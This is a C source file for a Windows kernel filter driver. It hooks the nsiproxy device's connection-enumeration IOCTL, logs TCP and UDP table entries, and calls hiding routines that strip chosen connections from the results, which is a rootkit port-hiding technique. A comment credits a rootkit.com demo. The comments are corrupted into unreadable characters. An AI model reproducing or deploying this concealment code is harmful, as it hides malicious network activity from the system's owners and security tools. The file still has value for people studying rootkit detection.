#include "Nsi.h"
#include "Hide.h"


//http://safe.sh/security/?type=detail&id=1381
NPI_MODULEID NPI_MS_TCP_MODULEID = {
    sizeof(NPI_MODULEID),
    MIT_GUID,
    {0xEB004A03, 0x9B1A, 0x11D4,
    {0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC}}
};


//http://safe.sh/security/?type=detail&id=1381
NPI_MODULEID NPI_MS_UDP_MODULEID = {
    sizeof(NPI_MODULEID),
    MIT_GUID,
    {0xEB004A02, 0x9B1A, 0x11D4,
    {0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC}}
};


//http://safe.sh/security/?type=detail&id=1381
NPI_MODULEID NPI_MS_RAW_MODULEID = {
    sizeof(NPI_MODULEID),
    MIT_GUID,
    {0xEB004A07, 0x9B1A, 0x11D4,
    {0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC}}
};


//////////////////////////////////////////////////////////////////////////////////////////////////


void DumpModuleInfo(_In_ PProcessTable Entry)
{
    PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OwningPid: %d", Entry->dwOwningPid);



}


void DumpStateInfo(_In_ PStateTable Entry)
/*

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrasm/882bec9c-2fb6-4acd-a9b6-dabcab1ac0d6
https://learn.microsoft.com/en-us/windows/win32/api/tcpmib/ns-tcpmib-mib_tcprow2
https://learn.microsoft.com/en-us/windows/win32/api/tcpmib/ns-tcpmib-mib_tcp6row
*/
{
    switch (Entry->State) {
    case MIB_TCP_STATE_CLOSED:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is closed");
        break;
    case MIB_TCP_STATE_LISTEN:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is in the listen state");
        break;
    case MIB_TCP_STATE_SYN_SENT:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "A SYN packet has been sent");
        break;
    case MIB_TCP_STATE_SYN_RCVD:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "A SYN packet has been received");
        break;
    case MIB_TCP_STATE_ESTAB:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection has been established");
        break;
    case MIB_TCP_STATE_FIN_WAIT1:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is waiting for a FIN packet");
        break;
    case MIB_TCP_STATE_FIN_WAIT2:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is waiting for a FIN packet");
        break;
    case MIB_TCP_STATE_CLOSE_WAIT:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is in the close wait state");
        break;
    case MIB_TCP_STATE_CLOSING:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is closing");
        break;
    case MIB_TCP_STATE_LAST_ACK:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is in the last ACK state");
        break;
    case MIB_TCP_STATE_TIME_WAIT:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is in the time wait state");
        break;
    case MIB_TCP_STATE_DELETE_TCB:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %s", "The TCP connection is in the delete TCB state");
        break;
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "State: %d", Entry->State);
        break;
    }

    //https://learn.microsoft.com/en-us/windows/win32/api/tcpmib/ne-tcpmib-tcp_connection_offload_state
    switch (Entry->dwOffloadState) {
    case TcpConnectionOffloadStateInHost:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OffloadState: %s", "InHost");
        break;
    case TcpConnectionOffloadStateOffloading:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OffloadState: %s", "Offloading");
        break;
    case TcpConnectionOffloadStateOffloaded:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OffloadState: %s", "Offloaded");
        break;
    case TcpConnectionOffloadStateUploading:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OffloadState: %s", "Uploading");
        break;
    case TcpConnectionOffloadStateMax:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OffloadState: %s", "Max");
        break;
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "OffloadState: %d", Entry->dwOffloadState);
        break;
    }

    //ASSERT(Entry->dwOffloadState < TcpConnectionOffloadStateMax);
}


void DumpTcpEntry(_In_ PTcpTable Table)
/*
����ṹ�������
LocalAddr
dwLocalScopeId
dwLocalPort
RemoteAddr
dwRemoteScopeId
dwRemotePort
�ȡ�
*/
{
    CHAR LocalIp[MAX_ADDRESS_STRING_LENGTH] = {0};
    CHAR RemoteIp[MAX_ADDRESS_STRING_LENGTH] = {0};

    switch (Table->LocalFamily) {
    case AF_INET:
    {
        RtlIpv4AddressToStringA(&Table->LocalAddrV4, LocalIp);
        break;
    }
    case AF_INET6:
    {
        RtlIpv6AddressToStringA(&Table->LocalAddrV6, LocalIp);
        break;
    }
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "LocalFamily: %d", Table->LocalFamily);
        break;
    }

    switch (Table->RemoteFamily) {
    case AF_INET:
    {
        RtlIpv4AddressToStringA(&Table->RemoteAddrV4, RemoteIp);
        break;
    }
    case AF_INET6:
    {
        RtlIpv6AddressToStringA(&Table->RemoteAddrV6, RemoteIp);
        break;
    }
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "RemoteFamily: %d", Table->RemoteFamily);
        break;
    }

    CHAR Buffer[MAX_PATH] = {0};
    NTSTRSAFE_PCSTR Format = "%s:%d\t->\t%s:%d";
    NTSTATUS NtStatus = RtlStringCbPrintfA(Buffer, _ARRAYSIZE(Buffer), Format, // _snprintf sprintf_s
                                           LocalIp,
                                           RtlUshortByteSwap(Table->LocalPort),
                                           RemoteIp,
                                           RtlUshortByteSwap(Table->RemotePort));
    if (!NT_SUCCESS(NtStatus)) {
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_ERROR_LEVEL, "Error: status:%#x", NtStatus);
    } else {
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "Info: %s", Buffer);
    }
}


void DumpUdpEntry(_In_ PUdpTable Table)
{
    CHAR LocalIp[MAX_ADDRESS_STRING_LENGTH] = {0};

    switch (Table->LocalFamily) {
    case AF_INET:
    {
        RtlIpv4AddressToStringA(&Table->LocalAddrV4, LocalIp);
        break;
    }
    case AF_INET6:
    {
        RtlIpv6AddressToStringA(&Table->LocalAddrV6, LocalIp);
        break;
    }
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "LocalFamily: %d", Table->LocalFamily);
        break;
    }

    CHAR Buffer[MAX_PATH] = {0};
    NTSTRSAFE_PCSTR Format = "LocalIp:%s, LocalPort:%d";
    NTSTATUS NtStatus = RtlStringCbPrintfA(Buffer, _ARRAYSIZE(Buffer), Format, // _snprintf sprintf_s
                                           LocalIp,
                                           RtlUshortByteSwap(Table->LocalPort));
    if (!NT_SUCCESS(NtStatus)) {
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_ERROR_LEVEL, "Error: status:%#x", NtStatus);
    } else {
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "Info: %s", Buffer);
    }
}


NTSTATUS DefaultMajorFunction(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIRP Irp)
{
    PDEVICE_EXTENSION DevExt = (PDEVICE_EXTENSION)DeviceObject->DeviceExtension;
    NTSTATUS Status = STATUS_SUCCESS;
    //PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
    //UCHAR MajorFunction = IrpStack->MajorFunction;

    if (Irp->CurrentLocation <= 1) {
        IoSkipCurrentIrpStackLocation(Irp);
    } else {
        IoCopyCurrentIrpStackLocationToNext(Irp);
    }

    Status = IoCallDriver(DevExt->AttachedDevice, Irp);//�������֮���ֹ����IrpStack����Ϣ��
    if (!NT_SUCCESS(Status)) {//����ʧ���Ǻ������ġ�
        //PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "Warning: IrpName: %s, Status:%#x",
        //        FltGetIrpName(MajorFunction), Status);
    }

    return Status;
}


void EnumUdpTable(_In_ PNsiParameters NsiParam)
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "Udp dwNumEntries: %d", NsiParam->Counter);

    PUdpTable Table = (PUdpTable)NsiParam->p1;
    PStateTable State = (PStateTable)NsiParam->StateInfo;
    PProcessTable Module = (PProcessTable)NsiParam->ProcessInfo;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        if (NsiParam->p1) {
            DumpUdpEntry(Table);
            Table++;
        }

        if (NsiParam->p2) {
            
        }

        if (NsiParam->StateInfo) {
            //DumpStateInfo(State);
            State++;
        }

        if (NsiParam->ProcessInfo) {
            DumpModuleInfo(Module);
            Module++;
        }
    }

    if (NsiParam->p2) {//������ӡ��Ϣ�����۲�Ͳ��ԣ��������ֵ�����0��
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "size2: %d", (int)NsiParam->size2);
    }

    if (NsiParam->StateInfo) {//������ӡ��Ϣ�����۲�Ͳ��ԣ��������ֵ�����0��
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "size3: %d", (int)NsiParam->size3);
    }

    if (NsiParam->ProcessInfo) {//������ӡ��Ϣ�����۲�Ͳ��ԣ��������ֵ�����0x20��
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "size4: %d", (int)NsiParam->size4);
    }
}


void EnumTcpTable(_In_ PNsiParameters NsiParam)
{
    if (nullptr == NsiParam) {
        return;
    }

    if (0 == NsiParam->Counter) {
        return;
    }

    PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "Tcp dwNumEntries: %d", NsiParam->Counter);

    PTcpTable Table = (PTcpTable)NsiParam->p1;
    PStateTable State = (PStateTable)NsiParam->StateInfo;
    PProcessTable Module = (PProcessTable)NsiParam->ProcessInfo;

    for (ULONG i = 0; i < NsiParam->Counter; i++) {
        if (NsiParam->p1) {//�����ɶ�ṹ�أ����Է���GetTcp6Table2��
            //ASSERT(NsiParam->size1 == 0x38);//���Կ϶�����ṹ�Ĵ�С��0x38��
            DumpTcpEntry(Table);
            Table++;
        }

        if (NsiParam->p2) {

        }

        if (NsiParam->StateInfo) {
            DumpStateInfo(State);
            State++;
        }

        if (NsiParam->ProcessInfo) {
            DumpModuleInfo(Module);
            Module++;
        }
    }   

    if (NsiParam->p2) {//�����ɶ�ṹ�أ����Է���GetTcp6Table2��
        /*
        ����ṹ��ָ����ΪNULL��
        */

        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "size2: %d", (int)NsiParam->size2);
    }

    if (NsiParam->StateInfo) {//�����ɶ�ṹ�أ����Է���GetTcp6Table2��
        /*
        �����ԣ�����ṹ�Ĵ�С��0x10.

        ����ṹ�������
        State
        dwOffloadState

        */

        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "size3: %d", (int)NsiParam->size3);
    }

    if (NsiParam->ProcessInfo) {//�����ɶ�ṹ�أ����Է���GetTcp6Table2��
        /*
        �����ԣ�����ṹ�Ĵ�С��0x20.

        ����ṹ�������
        dwOwningPid

        */

        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_INFO_LEVEL, "size4: %d", (int)NsiParam->size4);
    }
}


NTSTATUS EnumerateObjectsAllParameters(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIRP Irp)
/*
���ܣ����ض˿ڡ�

������ժ����Ҫָ��ժ������Ϣ��

�ص㣺InputBuffer�Ľṹ���͡�

�۸�ʱ����IoCallDriver֮��

InputBufferLength����С��0x3C��Ҳ��С��0x70�����۲춼��0x70��

����ϵͳ�ĺ���ԭ�ͣ�
//NTSTATUS NsippEnumerateObjectsAllParameters(PVOID InputBuffer,
//                                            SIZE_T Length,
//                                            KPROCESSOR_MODE RequestorMode,
//                                            PULONG_PTR Information)

����ϵͳ���÷���
NsippEnumerateObjectsAllParameters(Type3InputBuffer, 
                                   (SIZE_T)InputBufferLength, RequestorMode, &Irp->IoStatus.Information);

�ο���https://github.com/claudiouzelac/rootkit.com/blob/c8869de5a947273c9c151b44aa39643a7fea531c/cardmagic/PortHidDemo_Vista.c
*/
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
    PVOID Type3InputBuffer = IrpStack->Parameters.DeviceIoControl.Type3InputBuffer;
    KPROCESSOR_MODE RequestorMode = Irp->RequestorMode;
    ULONG InputBufferLength = IrpStack->Parameters.DeviceIoControl.InputBufferLength;
    ULONG outBufLength = IrpStack->Parameters.DeviceIoControl.OutputBufferLength;

    DBG_UNREFERENCED_LOCAL_VARIABLE(InputBufferLength);
    DBG_UNREFERENCED_LOCAL_VARIABLE(outBufLength);
    DBG_UNREFERENCED_LOCAL_VARIABLE(RequestorMode);

    Status = DefaultMajorFunction(DeviceObject, Irp);
    if (!NT_SUCCESS(Status)) {
        return Status;//�����STATUS_MORE_ENTRIES�������ǹ���״̬��STATUS_PENDING��
    }

    //if (STATUS_SUCCESS != Status) {
    //    return Status;
    //}

    __try {
        PNsiParameters NsiParam = (PNsiParameters)Type3InputBuffer;
        PNPI_MODULEID ModuleId = NsiParam->ModuleId;

        if (NmrIsEqualNpiModuleId(ModuleId, &NPI_MS_TCP_MODULEID)) {
            EnumTcpTable(NsiParam);

            if (g_IsHide) {
                HideTcpInfo(NsiParam);
            }
        }

        if (NmrIsEqualNpiModuleId(ModuleId, &NPI_MS_UDP_MODULEID)) {
            EnumUdpTable(NsiParam);

            if (g_IsHide) {
                HideUdpInfo(NsiParam);
            }
        }



    } __except (EXCEPTION_EXECUTE_HANDLER) {
        Print(DPFLTR_IHVNETWORK_ID, DPFLTR_ERROR_LEVEL, "ExceptionCode:%#X", GetExceptionCode());
    }

    return Status;
}


NTSTATUS NsiDeviceControl(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIRP Irp)
/*
�����ο���nsiproxy!NsippDispatch.

���и������У�NsippDispatchDeviceControl��
*/
{
    NTSTATUS Status = STATUS_SUCCESS;
    PIO_STACK_LOCATION  IrpStack = IoGetCurrentIrpStackLocation(Irp);// Pointer to current stack location   
    ULONG IoControlCode = IrpStack->Parameters.DeviceIoControl.IoControlCode;

    switch (IoControlCode) {
    case 0x12001Bu://NsippEnumerateObjectsAllParameters
        Status = EnumerateObjectsAllParameters(DeviceObject, Irp);
        break;
    case 0x120007u://NsippGetParameter
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x12000Fu://NsippGetAllParameters
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x12000Bu://NsippSetParameter
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x120013u://NsippSetAllParameters
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x12001Fu://NsippIsCallerNsiService + NsippRegisterChangeNotification
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x120023u://NsippIsCallerNsiService + NsippDeregisterChangeNotification
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x12003Fu://NsippRequestChangeNotification
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x120040u://NsippCancelChangeNotification
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x120047u://NsippEnumerateObjectsAllPersistentParametersWithMask
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x12004Bu://NsippGetAllPersistentParametersWithMask
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case 0x12004Fu://NsippSetAllPersistentParametersWithMask
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_WARNING_LEVEL,
                "Warning: MajorFunction: %d, IrpName: %s, IoControlCode:%d",
                IrpStack->MajorFunction, FltGetIrpName(IrpStack->MajorFunction), IoControlCode);
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    }

    return Status;
}


NTSTATUS NsiMajorFunction(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIRP Irp)
/*
�����ο���nsiproxy!NsippDispatch.
*/
{
    PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS Status = STATUS_SUCCESS;

    switch (IrpStack->MajorFunction) {
    case IRP_MJ_CREATE:
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case IRP_MJ_DEVICE_CONTROL:
        Status = NsiDeviceControl(DeviceObject, Irp);
        break;
    case IRP_MJ_INTERNAL_DEVICE_CONTROL:
        Status = NsiDeviceControl(DeviceObject, Irp);
        break;
    case IRP_MJ_CLEANUP:
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    case IRP_MJ_CLOSE:
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    default:
        PrintEx(DPFLTR_IHVNETWORK_ID, DPFLTR_WARNING_LEVEL, "Warning: MajorFunction: %d, IrpName: %s",
                IrpStack->MajorFunction, FltGetIrpName(IrpStack->MajorFunction));
        Status = DefaultMajorFunction(DeviceObject, Irp);
        break;
    }

    //if (STATUS_ACCESS_DENIED == Status) {//�����Ӧ����        
    //    Irp->IoStatus.Status = Status;
    //    Irp->IoStatus.Information = 0;
    //    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    //    return Status;
    //}

    return Status;
}
